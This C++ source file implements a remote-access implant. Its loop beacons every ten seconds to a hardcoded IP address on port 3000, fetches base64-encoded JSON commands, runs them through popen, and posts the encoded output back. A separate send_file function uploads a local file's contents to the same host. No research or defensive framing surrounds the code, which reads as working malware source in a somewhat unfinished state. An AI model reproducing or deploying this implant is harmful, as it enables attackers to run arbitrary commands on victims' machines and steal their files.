//
//  HTTPRequest
//

#include <iostream>
#include <fstream>
#include <streambuf>
#include <string>
#include <sstream>
#include <unistd.h>
#include "HTTPRequest.hpp"
#include "Base64/base64.cpp"
#include "json.hpp"

using namespace nlohmann;

std::string execute_command(std::string cmd) {
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}

	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	
	return result;
}

int send_file(std::string path) {

	std::ifstream t("test.txt");
	std::stringstream buffer;
	buffer << t.rdbuf();
	std::string post_data = "asldfjalskdjflajsfdjasfjflj";
	try
	{
	    http::Request request("http://3.129.5.34:3000/downloadfile");
	    // send a post request
	    const http::Response response = request.send("POST", buffer.str(), {
		"Content-Type: text/plain;charset=UTF-8"
	    });
	    std::cout << std::string(response.body.begin(), response.body.end()) << '\n'; // print the result
	}
	catch (const std::exception& e)
	{
	    std::cerr << "Request failed, error: " << e.what() << '\n';
	}

}

std::string makeRequest(std::string url, std::string cookie, std::string id) {

	std::string result;
        std::string output;

        http::InternetProtocol protocol = http::InternetProtocol::V4;

        http::Request request(url, protocol);

        const http::Response response = request.send("GET", "", {
            "Content-Type: application/x-www-form-urlencoded",
            "User-Agent: runscope/0.1",
	    "id: " + id,
	    "Cookie: " + cookie
        });

        if (response.status == http::Response::Ok &&
            !output.empty())
        {
            std::ofstream outfile(output, std::ofstream::binary);
            outfile.write(reinterpret_cast<const char*>(response.body.data()),
                          static_cast<std::streamsize>(response.body.size()));
        }
        else {
		std::cout << std::string(response.body.begin(), response.body.end()) << '\n';
		result = std::string(response.body.begin(), response.body.end()); 
	}

	return result;
}

json getCommands() {
	std::string command_encoded;
	std::string command_decoded;

	command_encoded = makeRequest("http://3.129.5.34:3000/getuser", "", "69");

	command_decoded = base64_decode(command_encoded, false);
	std::cout << command_decoded << std:: endl;

	json j = json::parse(command_decoded);

	return j;
}

int sendCommandOutput(json j) {
	std::string cmd_output_encoded;

	std::string s = j.dump();

	cmd_output_encoded = base64_encode(s, false);

	std::cout << cmd_output_encoded << std::endl;

	std::string confirmation = makeRequest("http://3.129.5.34:3000/setuser", cmd_output_encoded, "69");

	return 0;
}


int main() {

	int test = send_file("testpath");
	return 0;

	while (true) {

		sleep(10);

		json j = getCommands();

		if (j.empty()) {
			continue;
		}

		for (auto& [k, v] : j["exec_commands"].items()) {
			std::cout << j["exec_commands"][k] << std::endl;

			std::string exec_result = execute_command(j["exec_commands"][k]);
			std::cout << exec_result << std::endl;

			j["exec_commands"][k] = exec_result;
		}

		int status = sendCommandOutput(j["exec_commands"]);

		for (auto& [k, v] : j["download_files"].items()) {
			std::cout << j["download_files"][k] << std::endl;

			std::string exec_result = execute_command(j["download_files"][k]);
			std::cout << exec_result << std::endl;

			j["download_files"][k] = exec_result;
		}


	}

	return 0;

}

